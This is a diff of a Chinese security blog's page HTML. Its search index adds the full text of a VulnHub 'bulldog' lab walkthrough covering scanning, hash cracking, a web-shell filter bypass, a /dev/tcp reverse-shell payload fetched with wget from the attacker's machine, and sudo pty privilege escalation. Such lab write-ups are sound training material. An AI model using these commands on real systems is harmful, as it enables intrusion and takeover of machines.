@@ -9,7 +9,7 @@
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
 <title>PHP正则匹配 | DAMOXILAI</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1628299780456">
+<link rel="shortcut icon" href="/favicon.ico?v=1628852900560">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -211,7 +211,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">6</span>
+        <span class="site-item-stat-count">7</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -819,6 +819,10 @@ preg_replace -- 执行正则表达式的搜索和替换</p>
   </div>
   <div class="nav">
     <div class="nav-prev">
+      
+        <i class="fa fa-chevron-left"></i>
+        <a class="nav-pc-next" title="内网渗透之bulldog" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/">内网渗透之bulldog</a class="nav-pc-next">
+        <a class="nav-mobile-prev" title="内网渗透之bulldog" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/">上一篇</a>
       
     </div>
     <div class="nav-next">
@@ -1832,6 +1836,138 @@ preg_replace -- 执行正则表达式的搜索和替换</p>
     <div class="result" id="result">
       
       <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;靶机下载:&lt;br&gt;
+http://download.vulnhub.com/bulldog/bulldog.ova或http://download.vulnhub.com./bulldog/bulldog.ova.torrent&lt;/li&gt;
+&lt;li&gt;靶机：ip暂未知&lt;/li&gt;
+&lt;li&gt;攻击机kali：192.168.0.150&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验步骤&#34;&gt;二、实验步骤&lt;/h2&gt;
+&lt;h4 id=&#34;1信息收集&#34;&gt;(1)信息收集&lt;/h4&gt;
+&lt;h5 id=&#34;1-主机发现&#34;&gt;1、主机发现&lt;/h5&gt;
+&lt;p&gt;靶机与kali机在同一网段，nmap扫描或netdiscover扫描，他俩区别就是nmap扫描出本机IP&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;nmap -sP 192.168.0.0/24&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852312090.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;netdiscover -i eth0 -r 192.168.0.0/24&lt;/p&gt;
+&lt;p&gt;netdiscover -i 指定网卡 -r 指定网段&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852327805.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;找到目标主机ip：192.168.0.106&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h5 id=&#34;2-端口扫描&#34;&gt;2、端口扫描&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;masscan --rate=10000 --ports 0-65535 192.168.0.106&lt;/p&gt;
+&lt;p&gt;masscan --rate=每秒多少个数据包 --ports 端口范围 IP地址&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852342852.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;或者使用nmap -sS 192.168.0.106&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852355571.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;为防止漏扫，多扫描几次，可发现主机23，80，8080端口开放&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;扫描端口详细信息&lt;/p&gt;
+&lt;p&gt;nmap -sV -T4 -p 23,80,8080 192.168.0.106&lt;/p&gt;
+&lt;p&gt;-T4指定扫描过程中使用的时序（分为0-5等级）；-sV扫描版本的信息和开启的服务；也可以使用-A参数，详细扫描开放端口的具体服务；&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852366419.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;发现端口对应服务:23-ssh服务,80-http服务,8080-http服务&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h5 id=&#34;3-操作系统扫描&#34;&gt;3、操作系统扫描&lt;/h5&gt;
+&lt;p&gt;nmap -O 192.168.0.106&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852376300.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;pre&gt;&lt;code&gt;OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;2web渗透&#34;&gt;(2)Web渗透&lt;/h4&gt;
+&lt;h5 id=&#34;1访问80端口&#34;&gt;1.访问80端口&lt;/h5&gt;
+&lt;p&gt;点击页面，未发现任何有用信息&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852387112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2网站指纹信息扫描&#34;&gt;2.网站指纹信息扫描&lt;/h5&gt;
+&lt;p&gt;whatweb 192.168.0.106&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852400159.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+web指纹扫描用于识别目标所运行的web软件、后端服务器、编程语言等特征、实现对目标web应用的准确标识&lt;/p&gt;
+&lt;p&gt;应用名称（版本）、服务器软件（版本）、编程语言（版本）、应用框架（版本）四大特征的识别。&lt;/p&gt;
+&lt;h5 id=&#34;3网站目录扫描&#34;&gt;3.网站目录扫描&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852412832.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852426453.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;扫描Web目录，可以发现潜在的渗透目标&lt;/p&gt;
+&lt;p&gt;发现/admin文件及诸多目录&lt;/p&gt;
+&lt;h5 id=&#34;4查看网站目录&#34;&gt;4.查看网站目录&lt;/h5&gt;
+&lt;p&gt;4.1访问http://192.168.0.106/admin&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852438929.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;尝试万能钥匙，未果&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852447595.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;网页源码也没有tips&lt;/p&gt;
+&lt;p&gt;4.2看看别的目录，访问http://192.168.0.106/dev&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852457732.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;翻译过来的页面有提示：&lt;/p&gt;
+&lt;p&gt;完全从新服务器中删除PHP。此外，不使用PHPMyAdmin或任何其他流行的CMS系统；&lt;/p&gt;
+&lt;p&gt;新网站将完全用Django语言编写。目前，系统上启用了SSH。当我们转换到使用Web-&lt;/p&gt;
+&lt;p&gt;Shell(一个专有的shell接口)时，这个选项将被关闭；&lt;/p&gt;
+&lt;p&gt;此外，请注意我们将开始使用MongoDB，但是我们还没有完全安装它；&lt;/p&gt;
+&lt;p&gt;4.3访问http://192.168.0.106/dev/shell,提示：请与服务器进行身份验证以使用 Web-Shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852470720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;5查看网页源代码&#34;&gt;5.查看网页源代码&lt;/h5&gt;
+&lt;p&gt;在dev目录下，我们看到有一堆哈希，尝试解密&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852484270.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;解出nick用户的密码bulldog，也就解出这一个😑&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852495843.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;6尝试登陆成功&#34;&gt;6.尝试登陆，成功&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852507729.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;7访问刚刚的shell目录&#34;&gt;7.访问刚刚的shell目录&lt;/h5&gt;
+&lt;p&gt;7.1还真就web-shell，运行结果通过网页显示&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852517296.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.2&amp;amp;绕过限制&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852525247.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.3尝试直接反弹shell，直接错误&lt;/p&gt;
+&lt;p&gt;7.4发现wget能下载&lt;/p&gt;
+&lt;p&gt;直接python搭个网站，传shell文件，文件名就叫1&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.150/1234 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;python -m SimpleHTTPServer 80&lt;/strong&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852535663.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;然后&lt;strong&gt;ls &amp;amp; bash 1&lt;/strong&gt;,监听获得反弹shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852543430.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;8提权操作&#34;&gt;8.提权操作&lt;/h5&gt;
+&lt;p&gt;8.1查看系统中用户；bulldogadmin用户，django用户&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852552049.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;8.2进入用户bulldogadmin的home目录下，查看home目录下有什么文件，发现一个隐藏目录.hiddenadmindirectory;该目录下存在俩个文件，一个note提示，一个可执行文件；查看两个文件内容&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;20&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852559164.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;8.3strings 一下，提取显示非文本文件的文本字符&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;21&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852569619.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;中间有password，被h隔开，猜测可能是密码&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SUPERultimatePASSWORDyouCANTget&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;8.4那就尝试su，su root，都不行&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;22&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852584275.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;8.5可以用python调用本地的shell，打开一个新的终端，命令：&lt;/p&gt;
+&lt;p&gt;sudo python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/p&gt;
+&lt;p&gt;然后输入密码SUPERultimatePASSWORDyouCANTget&lt;/p&gt;
+&lt;p&gt;获得root权限&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;23&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628852592613.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
+&lt;p&gt;(1)主机发现、端口扫描、服务获取&lt;/p&gt;
+&lt;p&gt;(2)爆破出web目录，在查看源代码，发现用户名及密码&lt;/p&gt;
+&lt;p&gt;(3)登陆成功，获取webshell，绕过白名单限制；命令执行漏洞&lt;/p&gt;
+&lt;p&gt;(4)搭建web服务（python -m SimpleHTTPServer 80）；wget下载shell，bash执行，获取反弹shell&lt;/p&gt;
+&lt;p&gt;(5)/etc/passwd找寻系统id1000以后的用户，查看其文件，找到隐藏文件，发现隐藏密码&lt;/p&gt;
+&lt;p&gt;(6)python调用本地的shell，打开一个新的终端（sudo python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;）&lt;/p&gt;
+">内网渗透之bulldog</a>
+      </div>
+      
+      <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/php-zheng-ze-pi-pei/"" data-c="
           &lt;h2 id=&#34;一-正则表达式的介绍&#34;&gt;一、正则表达式的介绍：&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -2498,7 +2634,10 @@ public class aesdemo  {
         <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/xctf-mobile/"" data-c="
           &lt;h1 id=&#34;easy-apk&#34;&gt;easy-apk&lt;/h1&gt;
 &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1627005217353.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
-&lt;p&gt;new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&amp;quot;&lt;strong&gt;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&lt;/strong&gt;&amp;quot;）&lt;/p&gt;
+&lt;p&gt;new Base64New().Base64Encode(((EditText)&lt;br&gt;
+MainActivity.this.findViewById(R.id.editText)).&lt;br&gt;
+getText().toString().getBytes()).equals&lt;br&gt;
+(&amp;quot;&lt;strong&gt;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&lt;/strong&gt;&amp;quot;）&lt;/p&gt;
 &lt;p&gt;由关键代码可知，是一串字符在base64 加密后与&amp;quot;&lt;strong&gt;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&lt;/strong&gt;&amp;quot;匹配，那么可以逆向将已知密文串base64 解密获得输入明文&lt;/p&gt;
 &lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1627005235846.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;hr&gt;
